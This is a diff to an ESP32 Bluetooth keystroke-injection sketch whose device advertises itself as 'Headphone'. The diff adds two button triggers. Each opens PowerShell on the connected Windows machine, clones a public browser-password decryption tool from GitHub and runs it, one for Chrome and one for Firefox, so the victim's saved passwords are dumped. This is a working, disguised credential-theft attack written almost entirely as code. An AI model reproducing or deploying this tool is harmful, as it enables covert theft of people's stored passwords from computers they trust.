@@ -22,6 +22,8 @@
 #define BUTTON_18_PIN 20  // Trigger 18
 #define BUTTON_19_PIN 29  // Trigger 19
 #define BUTTON_20_PIN 30  // Trigger 20
+#define BUTTON_21_PIN 31  // Trigger 21
+#define BUTTON_22_PIN 32  // Trigger 22
 
 char kbd[] = "Headphone"; // Device Name
 BleKeyboard bleKeyboard(kbd, "Espressif", 100);
@@ -47,6 +49,8 @@ bool lastState17 = HIGH;
 bool lastState18 = HIGH;
 bool lastState19 = HIGH;
 bool lastState20 = HIGH;
+bool lastState21 = HIGH;
+bool lastState22 = HIGH;
 
 // helper to type a string char-by-char
 void sendString(const char* s, int charDelay = 10) {
@@ -95,6 +99,8 @@ void setup() {
   pinMode(BUTTON_18_PIN, INPUT_PULLUP);
   pinMode(BUTTON_19_PIN, INPUT_PULLUP);
   pinMode(BUTTON_20_PIN, INPUT_PULLUP);
+  pinMode(BUTTON_21_PIN, INPUT_PULLUP);
+  pinMode(BUTTON_22_PIN, INPUT_PULLUP);
 
   bleKeyboard.begin();
 }
@@ -121,6 +127,8 @@ void loop() {
     bool state18 = digitalRead(BUTTON_18_PIN);
     bool state19 = digitalRead(BUTTON_19_PIN);
     bool state20 = digitalRead(BUTTON_20_PIN);
+    bool state21 = digitalRead(BUTTON_21_PIN);
+    bool state22 = digitalRead(BUTTON_22_PIN);
 
     // Trigger 1:
     if (lastState1 == HIGH && state1 == LOW) {
@@ -691,6 +699,61 @@ void loop() {
       delay(1000);
     }
 
+    // Trigger 21:
+      if (lastState21 == HIGH && state21 == LOW) {
+      bleKeyboard.press(KEY_LEFT_GUI);
+      bleKeyboard.press('r');
+      delay(1000);
+      bleKeyboard.releaseAll();
+      delay(1000);
+      bleKeyboard.print("powershell");
+      delay(5000);
+      bleKeyboard.press(KEY_RETURN);
+      delay(1000);
+      sendStringSlow("cd C:\\Users\\Dell\\Pictures\\Screenshots\\OneDrive\\Desktop", 220);
+      bleKeyboard.press(KEY_RETURN);
+      delay(1200);
+      sendStringSlow("git clone https://github.com/ohyicong/decrypt-chrome-passwords.git", 200);
+      bleKeyboard.press(KEY_RETURN);
+      delay(6000);
+      sendStringSlow("cd decrypt-chrome-passwords", 180);
+      bleKeyboard.press(KEY_RETURN);
+      delay(1200);
+      sendStringSlow("python decrypt_chrome_password.py", 150);
+      bleKeyboard.press(KEY_RETURN);
+      delay(1000);
+    }
+
+    // Trigger 22:
+      if (lastState22 == HIGH && state22 == LOW) {
+      bleKeyboard.press(KEY_LEFT_GUI);
+      bleKeyboard.press('r');
+      delay(1000);
+      bleKeyboard.releaseAll();
+      delay(1000);
+      bleKeyboard.print("powershell");
+      delay(5000);
+      bleKeyboard.press(KEY_RETURN);
+      delay(1000);
+      sendStringSlow("cd C:\\Users\\Dell\\Pictures\\Screenshots\\OneDrive\\Desktop", 220);
+      bleKeyboard.press(KEY_RETURN);
+      delay(1200);
+      sendStringSlow("git clone https://github.com/unode/firefox_decrypt.git", 200);
+      bleKeyboard.press(KEY_RETURN);
+      delay(6000);
+      sendStringSlow("cd firefox_decrypt", 180);
+      bleKeyboard.press(KEY_RETURN); 
+      delay(1200);
+      sendStringSlow("python firefox_decrypt.py", 150);
+      bleKeyboard.press(KEY_RETURN);
+      delay(1000);
+      bleKeyboard.print("2");
+      delay(5000);
+      bleKeyboard.press(KEY_RETURN);
+      delay(500);
+      bleKeyboard.releaseAll(); 
+    }
+
 
     // update last states
     lastState1 = state1;
@@ -713,6 +776,8 @@ void loop() {
     lastState18 = state18;
     lastState19 = state19;
     lastState20 = state20;
+    lastState21 = state21;
+    lastState22 = state22;
   }
 
   delay(10); // Small debounce
